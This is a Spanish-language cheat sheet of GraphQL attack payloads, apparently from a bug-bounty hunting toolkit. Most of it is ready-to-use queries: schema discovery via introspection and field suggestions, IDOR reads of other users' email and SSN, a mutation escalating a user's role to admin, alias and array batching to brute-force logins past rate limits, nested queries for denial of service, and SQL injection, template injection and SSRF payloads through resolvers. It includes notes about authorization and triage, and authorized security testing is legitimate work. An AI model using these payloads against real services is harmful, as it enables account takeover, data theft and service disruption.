# GraphQL Payloads

> Ver `skills/hunt/graphql`. Introspection sola es never-submit — el valor
> está en lo que el schema permite HACER.

## Introspection (schema completo)

```graphql
query { __schema { queryType { name } mutationType { name } types {
  name fields { name type { name kind ofType { name } } } } } }
```

```bash
# Alternativas cuando el endpoint bloquea introspección por keyword:
# - GET con query en URL
# - content-type distinto (application/json vs application/graphql)
# - field suggestion (ver abajo) para reconstruir el schema a mano
# - clairvoyance / graphql-cop para brute-force de tipos
```

## Field suggestion (schema discovery sin introspection)

```graphql
{ user(id: "1") { nam } }
-- Respuesta: 'Cannot query field "nam". Did you mean "name"?'
-- Iterar para mapear campos manualmente.
```

## Authorization / IDOR en GraphQL

```graphql
-- AuthN a nivel query, authZ por objeto olvidada:
query { user(id: "2") { email ssn } }          -- como user 1 → IDOR
query { node(id: "VXNlcjoy") { ... on User { email } } }   -- Relay global IDs
-- Mutaciones sin check de ownership:
mutation { updateUser(id: "2", input: {role: "admin"}) { id role } }
```

## Batching abuse (rate-limit / brute-force bypass)

```graphql
-- Array batching: 100 login attempts en UN request HTTP:
[{"query":"mutation{login(user:\"a\",pass:\"x1\"){token}}"},
 {"query":"mutation{login(user:\"a\",pass:\"x2\"){token}}"}, ...]
-- Alias batching dentro de una query:
mutation { a: login(user:"a",pass:"x1"){token}
           b: login(user:"a",pass:"x2"){token} }
```

## DoS por profundidad/complejidad (solo con gate)

```graphql
query { user(id:"1") { friends { friends { friends { friends { name } } } } } }
-- Directivas anidadas, fragmentos circulares. Documentar ausencia de límite
-- de profundidad como hardening gap; NO ejecutar DoS real sin autorización.
```

## Injection a través de resolvers

```graphql
-- Los args llegan a resolvers que tocan BD/OS/HTTP:
query { search(q: "' OR 1=1-- -") { id } }          -- SQLi vía resolver
query { user(name: "{{7*7}}") { id } }              -- SSTI vía resolver
mutation { importData(url: "http://{TOKEN}.oast.host/") { ok } }  -- SSRF
-- Tratar como los skills de clase correspondientes una vez detectado.
```

## Gotchas de uso

- Introspection habilitada = info/low como máximo (never-submit: no solo).
- Errores verbosos con stack traces = info-disclosure separada.
- "Query cost analysis" ausente se documenta como hardening, no como DoS
  demostrado.
- Muchos endpoints GraphQL aceptan GET con query en URL → habilita CSRF en
  mutaciones si no hay verificación de content-type (ver csrf).
